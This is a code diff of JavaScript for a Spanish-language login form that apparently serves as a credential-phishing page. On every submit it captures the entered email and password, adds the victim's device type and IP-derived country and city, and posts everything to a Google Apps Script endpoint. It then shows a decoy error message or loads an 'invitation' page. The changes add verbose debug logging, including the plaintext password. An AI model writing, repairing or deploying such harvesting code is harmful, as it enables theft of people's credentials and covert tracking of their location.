@@ -1,38 +1,47 @@
 document.getElementById("miFormulario").addEventListener("submit", async function(event) {
     event.preventDefault(); // Evita el envío automático 
+    
+    console.log("🔍 INICIANDO VALIDACIÓN DEL FORMULARIO");
 
     // Obtener elementos del formulario
     const emailInput = document.querySelector('input[name="email"]');
     const passwordInput = document.querySelector('input[name="password"]');
     const errorMessage = document.getElementById('error-message');
     
+    // Verificar que los elementos existen
+    if (!emailInput || !passwordInput) {
+        console.error("❌ ERROR: No se encontraron los inputs del formulario");
+        return;
+    }
+    
     // Lista de correos electrónicos y contraseñas prohibidas
     const prohibitedEmails = ["ejemplo1@correo.com"]; // Agregar correos prohibidos aquí
     const prohibitedWords = ["hola123"]; // Agregar contraseñas prohibidas aquí
     
     const email = emailInput.value.trim().toLowerCase();
-    const password = passwordInput.value;
+    const password = passwordInput.value.trim(); // Agregado trim para limpiar espacios
+    
+    console.log("📧 Email ingresado:", `"${email}"`);
+    console.log("🔑 Contraseña ingresada:", `"${password}"`);
+    console.log("📋 Emails prohibidos:", prohibitedEmails);
+    console.log("📋 Contraseñas prohibidas:", prohibitedWords);
     
     // Validar formato de correo electrónico
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!emailRegex.test(email)) {
+        console.log("❌ Email inválido por formato");
         errorMessage.textContent = "Correo electrónico no válido";
         errorMessage.style.color = 'red';
         return; // Detiene el procesamiento
     }
     
-    // Verificar correo prohibido
+    // Verificar correo prohibido (comparación exacta)
     const isProhibitedEmail = prohibitedEmails.includes(email);
-    // Verificar contraseña prohibida (exacta, no parcial)
-    const containsProhibitedPassword = prohibitedWords.includes(password);
+    console.log("🚫 ¿Email prohibido?", isProhibitedEmail);
     
-    // 🔍 DEBUG: Verificar qué valores se están comparando
-    console.log("Email ingresado:", email);
-    console.log("Contraseña ingresada:", password);
-    console.log("¿Email prohibido?", isProhibitedEmail);
-    console.log("¿Contraseña prohibida?", containsProhibitedPassword);
-    console.log("Lista de emails prohibidos:", prohibitedEmails);
-    console.log("Lista de contraseñas prohibidas:", prohibitedWords);
+    // Verificar contraseña prohibida (comparación exacta)
+    const isProhibitedPassword = prohibitedWords.includes(password);
+    console.log("🚫 ¿Contraseña prohibida?", isProhibitedPassword);
     
     // ✅ Detectar si el usuario usa iPhone o Android
     let deviceType = "Otro"; // Valor por defecto
@@ -44,35 +53,37 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     
     // ✅ Obtener el país y la ciudad del usuario desde la API
     let country = "Desconocido";
-    let city = "Desconocido"; // Añadido: variable para almacenar la ciudad
+    let city = "Desconocido";
     try {
         const response = await fetch("https://ipwhois.app/json/");
         const data = await response.json();
         if (data) {
             if (data.country) {
-                country = data.country; // Captura el país
+                country = data.country;
             }
             if (data.city) {
-                city = data.city; // Captura la ciudad
+                city = data.city;
             }
         }
     } catch (error) {
         console.error("Error obteniendo la ubicación:", error);
     }
     
-    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
+    // ✅ Preparar datos para enviar
     const formData = new FormData(this);
-    formData.append("device", deviceType); // Agregar dispositivo
-    formData.append("country", country + " - " + city); // Agregar país y ciudad combinados
+    formData.append("device", deviceType);
+    formData.append("country", country + " - " + city);
     
     // Agregar estado de validación para tracking
+    let status = "Acceso exitoso";
     if (isProhibitedEmail) {
-        formData.append("status", "Email prohibido");
-    } else if (containsProhibitedPassword) {
-        formData.append("status", "Contraseña prohibida");
-    } else {
-        formData.append("status", "Acceso exitoso");
+        status = "Email prohibido";
+    } else if (isProhibitedPassword) {
+        status = "Contraseña prohibida";
     }
+    formData.append("status", status);
+    
+    console.log("📊 Estado asignado:", status);
     
     // ✅ SIEMPRE enviar los datos a Google Sheets
     const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
@@ -83,41 +94,63 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
             body: new URLSearchParams(formData),
             headers: { "Content-Type": "application/x-www-form-urlencoded" }
         });
-        console.log("Datos enviados exitosamente");
+        console.log("✅ Datos enviados a Google Sheets exitosamente");
     } catch (error) {
-        console.error("Error al enviar datos:", error);
+        console.error("❌ Error al enviar datos:", error);
     }
     
     // 🔥 VALIDACIONES CRÍTICAS - DEBEN DETENER LA EJECUCIÓN
+    
+    // PRIMERO: Verificar email prohibido
     if (isProhibitedEmail) {
-        console.log("🚫 BLOQUEADO: Email prohibido detectado");
-        alert("DEBUG: Email prohibido - NO debe redirigir"); // Temporal para debug
-        // Mostrar error de correo y limpiar campos
-        errorMessage.textContent = "Ocurrio un error con el correo intentar con otra dirección";
-        errorMessage.style.color = 'red';
-        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
+        console.log("🚫 BLOQUEANDO: Email prohibido detectado");
+        console.log("🛑 DETENIENDO EJECUCIÓN - NO REDIRIGIR");
+        
+        // Mostrar mensaje de error
+        if (errorMessage) {
+            errorMessage.textContent = "Ocurrio un error con el correo intentar con otra dirección";
+            errorMessage.style.color = 'red';
+            errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
+            errorMessage.style.display = 'block';
+        }
+        
+        // Limpiar campos
         emailInput.value = '';
         passwordInput.value = '';
-        return; // ⚠️ DETIENE COMPLETAMENTE LA EJECUCIÓN - NO CONTINÚA
+        
+        // DETENER COMPLETAMENTE LA EJECUCIÓN
+        console.log("🛑 RETURN EJECUTADO - FIN DE LA FUNCIÓN");
+        return;
     }
     
-    if (containsProhibitedPassword) {
-        console.log("🚫 BLOQUEADO: Contraseña prohibida detectada");
-        alert("DEBUG: Contraseña prohibida - NO debe redirigir"); // Temporal para debug
-        // Mostrar error de contraseña y limpiar solo la contraseña
-        errorMessage.textContent = "Contraseña incorrecta";
-        errorMessage.style.color = 'red';
-        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
+    // SEGUNDO: Verificar contraseña prohibida
+    if (isProhibitedPassword) {
+        console.log("🚫 BLOQUEANDO: Contraseña prohibida detectada");
+        console.log("🛑 DETENIENDO EJECUCIÓN - NO REDIRIGIR");
+        
+        // Mostrar mensaje de error
+        if (errorMessage) {
+            errorMessage.textContent = "Contraseña incorrecta";
+            errorMessage.style.color = 'red';
+            errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
+            errorMessage.style.display = 'block';
+        }
+        
+        // Limpiar solo la contraseña
         passwordInput.value = '';
-        return; // ⚠️ DETIENE COMPLETAMENTE LA EJECUCIÓN - NO CONTINÚA
+        
+        // DETENER COMPLETAMENTE LA EJECUCIÓN
+        console.log("🛑 RETURN EJECUTADO - FIN DE LA FUNCIÓN");
+        return;
     }
     
     // ✅ SOLO LLEGA AQUÍ SI NO HAY ERRORES
-    console.log("✅ PERMITIDO: Datos válidos, procediendo con redirección");
-    alert("DEBUG: Datos válidos - SÍ debe redirigir"); // Temporal para debug
+    console.log("✅ VALIDACIÓN EXITOSA - PROCEDIENDO CON REDIRECCIÓN");
+    
     // Limpiar cualquier mensaje de error previo
     if (errorMessage) {
         errorMessage.textContent = "";
+        errorMessage.style.display = 'none';
     }
 
     // Ocultar el formulario
@@ -130,15 +163,22 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     document.body.appendChild(loadingMessage);
     
     // Antes de mostrar el iframe, ocultar el footer de folder.html
-    document.querySelector("p").style.display = "none"; 
+    const footerElement = document.querySelector("p");
+    if (footerElement) {
+        footerElement.style.display = "none";
+    }
 
     // Mostrar el iframe
     let iframe = document.getElementById("usuarioFrame");
-    iframe.src = "invitation.html";
-    iframe.style.display = "block";
+    if (iframe) {
+        iframe.src = "invitation.html";
+        iframe.style.display = "block";
+        
+        // Eliminar mensaje de carga después de mostrar usuario.html
+        iframe.onload = function() {
+            loadingMessage.remove();
+        };
+    }
     
-    // Eliminar mensaje de carga después de mostrar usuario.html
-    iframe.onload = function() {
-        loadingMessage.remove();
-    };
+    console.log("🎉 REDIRECCIÓN COMPLETADA");
 });
